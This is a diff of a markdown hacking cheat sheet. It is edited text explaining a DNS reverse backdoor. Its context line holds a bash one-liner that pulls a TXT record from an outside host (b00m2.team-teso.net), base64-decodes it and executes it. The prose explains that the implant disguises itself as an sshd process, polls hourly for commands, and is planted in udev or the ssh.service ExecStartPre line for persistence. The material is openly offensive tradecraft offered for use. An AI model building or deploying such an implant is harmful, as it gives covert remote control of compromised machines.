@@ -1870,11 +1870,12 @@ bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 
 ```
 
 An elaborate DNS reverse backdoor (as a daemon and living-off-the-land):
+- Depends on bash, dig and base64 only.
 - Hides as `sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups`
-- Requests a TXT record every 60 minutes (from b00m2.team-teso.net).
-- Base64-decode the TXT record and execute the command on the target.
+- Requests a DNS TXT record every 60 minutes (from b00m2.team-teso.net).
+- Base64-decodes the TXT record and executes the command on the target.
 
-1. Modify the following to your liking and then Cut & Paste it to get the 1-line implant. 
+1. Modify the following to your liking and then Cut & Paste it to generate the 1-line implant. 
 
 ```shell
 base64 -w0 >x.txt <<-'EOF'
@@ -1893,7 +1894,7 @@ EOF
 echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
 ```
 
-2. Add this 1-line implant to any startup script on the target (e.g. to [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=` in */usr/lib/systemd/system/ssh.service*). An example ssh.service:
+2. Add this 1-line implant to any startup script on the target (e.g. to [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=` in */usr/lib/systemd/system/ssh.service*). An clever example for ssh.service:
 ```
 ...
 [Service]
